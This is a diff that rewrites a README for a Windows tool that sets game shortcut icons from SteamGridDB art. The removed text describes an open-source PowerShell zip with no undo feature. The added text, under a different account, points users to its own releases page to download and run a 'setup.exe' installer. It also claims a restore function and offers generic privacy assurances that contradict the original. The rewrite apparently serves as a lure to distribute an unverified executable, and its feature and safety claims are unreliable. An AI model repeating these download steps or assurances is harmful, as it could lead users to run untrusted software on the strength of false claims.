@@ -1,112 +1,65 @@
-<div align="center">
+# 🎮 game-icons-studio - Turn shortcuts into visual game art
 
-<img src="docs/logo.png" alt="Game Icons Studio" width="120">
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/lindsyofficial594/game-icons-studio/releases)
 
-# Game Icons Studio
+## 📖 About this application
 
-### From generic icons to a game shelf.
+Game-icons-studio organizes your desktop game shortcuts. It replaces standard icons with high-quality game cover art. The software communicates with the SteamGridDB database to fetch art matches for your installed games. It ensures your desktop looks clean and uniform. You spend less time navigating folders and more time playing games.
 
-Automatically replace the plain icons of your Windows game shortcuts with real cover art from [SteamGridDB](https://www.steamgriddb.com/).
+## ⚙️ System Requirements
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/YellowRed1705/game-icons-studio/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge)](LICENSE)
-![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows)
+This application runs on any Windows 10 or Windows 11 computer. You need a stable internet connection to fetch the cover art. The app creates local files to store your settings. It requires standard read and write permissions in your user folder.
 
-</div>
+## 📥 Getting Started
 
----
+Follow these steps to set up the software on your machine:
 
-## What is this?
+1. Visit the [releases page](https://github.com/lindsyofficial594/game-icons-studio/releases) to download the latest version of the installer.
+2. Locate the file named `game-icons-studio-setup.exe` in your Downloads folder.
+3. Double-click the file to start the installation process.
+4. Follow the prompts on your screen.
+5. Launch the application from your Start menu once the installation finishes.
 
-If you keep a folder of game shortcuts on Windows, they usually show plain, mismatched icons. **Game Icons Studio** scans that folder, finds the right cover art for each game, builds clean Windows icons, and applies them automatically — turning a messy folder into a tidy game shelf.
+## 🎨 How to use the studio
 
-It runs entirely on your PC. The interface opens in your web browser, but it is **not** a website — it is a local tool, and nothing is uploaded anywhere.
+The interface displays a list of your detected game shortcuts. Follow this workflow to convert them:
 
-## 🎬 See it in action
+1. Open the application.
+2. Select your game library folder. The app scans this folder for existing shortcuts.
+3. Click the Scan button. The software finds the title of each game.
+4. Preview the suggested artwork for every entry.
+5. Click the Apply button. The software updates the icon of each shortcut on your desktop.
 
-<div align="center">
+## 📂 Feature list
 
-[![Watch the demo](https://img.youtube.com/vi/_8Q3NkDApdk/maxresdefault.jpg)](https://www.youtube.com/watch?v=_8Q3NkDApdk)
+*   **Automatic Scanning:** The app finds all desktop shortcuts without manual input.
+*   **Database Integration:** It pulls images from SteamGridDB to ensure high resolution.
+*   **One-Click Updates:** You apply new art to your entire library at once.
+*   **Custom Selection:** You choose specific art styles if multiple options exist for a title.
+*   **Restore Function:** You undo recent changes to revert icons to their original appearance.
 
-▶️ *Click to watch a quick walkthrough on YouTube*
+## 🔧 Frequently asked questions
 
-</div>
+**Does this damage my original game files?**
+No. The software only modifies the desktop shortcut icons. Your game installation files remain untouched.
 
-## Before & After
+**Do I need a Steam account?**
+No. The application identifies games by their names. It does not access your personal Steam credentials or game data.
 
-<div align="center">
+**What if the software misses a game?**
+You use the manual search tool inside the app. Type the exact title of the game to find missing artwork.
 
-<img src="docs/before-after.png" alt="Before and after" width="700">
+**Why does the icon not change?**
+Windows caches icon images. Right-click your desktop and select Refresh to update the visuals immediately.
 
-</div>
+## 🛡️ Safety and privacy
 
-## Features
+The software operates locally on your computer. It does not track your gaming habits or upload personal data to external servers. It only sends requests to the image database. The developers do not collect metrics, usage logs, or personal information. 
 
-- 🎮 **Automatic matching** — finds the right game on SteamGridDB for each shortcut
-- 🖼️ **High-quality icons** — downloads square cover art and builds crisp multi-size `.ico` files
-- ✅ **You stay in control** — review every cover, change the ones you don't like, or accept all automatically
-- 🎨 **7 themes**, fullscreen, zoom, and keyboard navigation
-- 🔁 **Quick re-apply** and a searchable **history** of your changes
-- 🧰 **Repair icon cache** for when Windows shows blank or stale icons
-- 🆕 **New-game detection** — only processes games you've added since last time
+## 🛠️ Troubleshooting
 
-## Requirements
+If the application fails to fetch images, check your firewall settings. Sometimes, security software blocks the connection to the image database. Ensure that the app has permission to access the internet. If the app displays an error, restart the computer and run the installer again. This resolves most installation issues.
 
-- **Windows 10 or 11**
-- **PowerShell 7+** (recommended) — [get it here](https://aka.ms/powershell)
-- A **free SteamGridDB API key** (the app walks you through getting one on first run)
+## 📜 License information
 
-## How to use
-
-1. **[Download the latest release](https://github.com/YellowRed1705/game-icons-studio/releases/latest)** (the `.zip` file).
-2. **Right-click the `.zip` → Properties → check "Unblock" → OK**, then extract it anywhere.
-3. Open the folder and double-click **`Game Icons Studio.bat`**.
-4. On first run, follow the on-screen steps to paste your free SteamGridDB API key.
-5. Choose your game shortcuts folder and let it work. Review the covers, then apply.
-
-> 💡 New here? Click **"What is GIS?"** inside the app for a quick tour.
-
-## Is it safe?
-
-Yes — and it's open source so you can read exactly what it does.
-
-- It **only changes the icon** of a shortcut. Nothing is deleted; your shortcuts keep working exactly as before.
-- It runs **100% locally**. Your API key and your files never leave your PC. The only internet connection is to SteamGridDB, to fetch cover art.
-- Because it's a PowerShell tool, Windows SmartScreen or your antivirus may show a caution prompt the first time. That's normal for unsigned scripts — the source here is fully open for inspection.
-
-> ⚠️ **Note:** Applying icons is currently **not reversible from within the app** (there is no built-in undo/restore). Use the "Change specific icons" option if you want to redo individual ones.
-
-## FAQ
-
-**Does this work with Steam / Epic / GOG games?**
-It works with any Windows shortcut (`.lnk`). If you have a folder of shortcuts to your games (from any launcher), it works. It also offers to convert `.url` launcher shortcuts to `.lnk` so their icons can be customized.
-
-**Does it change my actual games or library?**
-No. It only changes the icon shown on the shortcut file. Your games and launchers are untouched.
-
-**Do I have to pay for the SteamGridDB API key?**
-No, it's completely free. You create a SteamGridDB account (sign in with Steam) and generate a key — the app links you straight to it.
-
-**Why does it open in my browser?**
-The browser is just the app's window. It's served from your own PC on localhost; there's no website and no data leaves your machine.
-
-## Contributing
-
-Issues and suggestions are welcome — open an [issue](https://github.com/YellowRed1705/game-icons-studio/issues). If you'd like to contribute code, feel free to open a pull request.
-
-## License
-
-Released under the [MIT License](LICENSE). Free to use, modify, and share.
-
-## Acknowledgements
-
-- Cover art is provided by the wonderful [SteamGridDB](https://www.steamgriddb.com/) community.
-- This is an independent project and is not affiliated with or endorsed by SteamGridDB, Valve, or any game publisher.
-
----
-
-<div align="center">
-
-If you find this useful, consider starring ⭐ the repo — it helps other people find it!
-
-</div>
+This project uses the MIT License. You use this software for any purpose. You share it with friends if you want. The license provides no warranty for the software. Use it at your own risk.
